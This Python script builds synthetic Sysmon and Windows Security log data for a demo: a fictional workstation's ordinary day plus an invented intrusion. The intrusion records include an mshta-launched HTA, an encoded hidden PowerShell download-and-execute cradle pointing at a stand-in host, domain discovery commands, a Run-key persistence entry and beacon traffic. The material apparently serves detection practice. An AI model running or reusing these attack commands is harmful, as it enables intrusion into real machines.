"""Builds demo/demo-events.jsonl: a small synthetic workstation day with a made-up intrusion.

Everything is invented (host DEMO-WS01, user j.doe, *.example domains, RFC 5737 IPs).
Deterministic: same output on every run.
"""
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

rnd = random.Random(4242)
SYSMON = "Microsoft-Windows-Sysmon/Operational"
HOST = "DEMO-WS01.corp.example"
USER = "CORP\\j.doe"
start = datetime(2026, 3, 2, 7, 30, tzinfo=timezone.utc)
events = []
rec = 1000
pid = 4000


def ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}Z"


def add(dt, channel, eid, **fields):
    global rec
    rec += 1
    ev = {"@timestamp": ts(dt), "EventID": eid, "Channel": channel, "Computer": HOST, "EventRecordID": rec}
    ev.update(fields)
    events.append(ev)


def proc(dt, image, cmd, parent="C:\\Windows\\explorer.exe", user=USER, ofn=None):
    global pid
    pid += rnd.randint(4, 60)
    add(dt, SYSMON, 1, UtcTime=ts(dt).replace("T", " ")[:-1], ProcessId=pid, Image=image, CommandLine=cmd,
        OriginalFileName=ofn or image.split("\\")[-1], ParentImage=parent, User=user,
        IntegrityLevel="Medium", Hashes="SHA256=" + "".join(rnd.choice("0123456789ABCDEF") for _ in range(64)))
    return pid


def dns(dt, image, name, result):
    add(dt, SYSMON, 22, Image=image, QueryName=name, QueryStatus="0", QueryResults=result)


def conn(dt, image, ip, port, host="-"):
    add(dt, SYSMON, 3, Image=image, Protocol="tcp", Initiated="true", SourceIp="192.0.2.10",
        DestinationIp=ip, DestinationPort=port, DestinationHostname=host, User=USER)


# Normal day: browser, Office, Teams, OneDrive, system noise
apps = [
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"chrome.exe"', ["intranet.corp.example", "news.example", "mail.corp.example"]),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", '"EXCEL.EXE" "C:\\Users\\j.doe\\Documents\\Q1_budget.xlsx"', ["officecdn.example"]),
    ("C:\\Users\\j.doe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", '"OneDrive.exe" /background', ["sync.files.example"]),
    ("C:\\Users\\j.doe\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", '"Teams.exe"', ["teams.chat.example"]),
]
t = start
while t < start + timedelta(hours=9):
    t += timedelta(seconds=rnd.randint(40, 420))
    image, cmd, domains = rnd.choice(apps)
    if rnd.random() < 0.3:
        proc(t, image, cmd)
    d = rnd.choice(domains)
    ip = f"198.51.100.{rnd.randint(2, 250)}"
    dns(t + timedelta(milliseconds=120), image, d, f"::ffff:{ip};")
    conn(t + timedelta(milliseconds=300), image, ip, 443)
    if rnd.random() < 0.15:
        proc(t, "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
             parent="C:\\Windows\\System32\\services.exe", user="NT AUTHORITY\\SYSTEM")
    if rnd.random() < 0.05:
        proc(t, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
             'powershell.exe -NoProfile -Command "Get-Service | Where Status -eq Running"',
             parent="C:\\Windows\\System32\\cmd.exe", user="CORP\\it.admin", ofn="PowerShell.EXE")
    if rnd.random() < 0.08:
        add(t, "Security", 4624, TargetUserName="j.doe", TargetDomainName="CORP", LogonType=rnd.choice([2, 3, 7]),
            IpAddress=rnd.choice(["-", "192.0.2.20"]), WorkstationName="DEMO-WS01")

# The intrusion (13:05 UTC): HTA from a phishing link -> encoded PowerShell -> discovery -> Run key -> beacon
a = start + timedelta(hours=5, minutes=35)
chrome = apps[0][0]
dns(a, chrome, "invoice-portal.example", "::ffff:203.0.113.45;")
conn(a + timedelta(milliseconds=200), chrome, "203.0.113.45", 443)
add(a + timedelta(seconds=4), SYSMON, 11, Image=chrome, TargetFilename="C:\\Users\\j.doe\\Downloads\\Invoice_4471.hta")
mshta = "C:\\Windows\\System32\\mshta.exe"
proc(a + timedelta(seconds=20), mshta, '"C:\\Windows\\System32\\mshta.exe" "C:\\Users\\j.doe\\Downloads\\Invoice_4471.hta"', ofn="MSHTA.EXE")
ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC4AZQB4AGEAbQBwAGwAZQAvAGEAJwApAA=="
proc(a + timedelta(seconds=22), ps, f"powershell.exe -nop -w hidden -enc {enc}", parent=mshta, ofn="PowerShell.EXE")
add(a + timedelta(seconds=23), "Microsoft-Windows-PowerShell/Operational", 4104, MessageNumber=1, MessageTotal=1,
    ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.example/a')",
    ScriptBlockId="7f1c2a9e-1b77-4d0e-9a51-0c3f2d8e6b11", Path="")
dns(a + timedelta(seconds=24), ps, "cdn-update.example", "::ffff:203.0.113.77;")
conn(a + timedelta(seconds=24, milliseconds=300), ps, "203.0.113.77", 443)
for i, c in enumerate(["whoami /all", "net group \"Domain Admins\" /domain", "nltest /dclist:corp.example", "ipconfig /all"]):
    exe = c.split()[0]
    path = f"C:\\Windows\\System32\\{exe}.exe"
    proc(a + timedelta(seconds=60 + i * 7), path, c, parent=ps, ofn=f"{exe}.exe")
drop = "C:\\Users\\j.doe\\AppData\\Roaming\\Microsoft\\Windows\\updsvc.exe"
add(a + timedelta(seconds=95), SYSMON, 11, Image=ps, TargetFilename=drop)
add(a + timedelta(seconds=97), SYSMON, 13, Image=ps, EventType="SetValue",
    TargetObject="HKU\\S-1-5-21-1111111111-2222222222-3333333333-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService",
    Details=drop)
proc(a + timedelta(seconds=99), drop, f'"{drop}"', parent=ps, ofn="beacon.exe")
for k in range(12):
    b = a + timedelta(seconds=110 + k * 300 + rnd.randint(-20, 20))
    dns(b, drop, "telemetry-sync.example", "::ffff:203.0.113.77;")
    conn(b + timedelta(milliseconds=150), drop, "203.0.113.77", 8443)

events.sort(key=lambda e: e["@timestamp"])
out = Path(__file__).resolve().parent.parent / "demo" / "demo-events.jsonl"
out.parent.mkdir(exist_ok=True)
out.write_text("\n".join(json.dumps(e, ensure_ascii=False) for e in events) + "\n", encoding="utf-8")
print(f"{len(events)} events -> {out}")
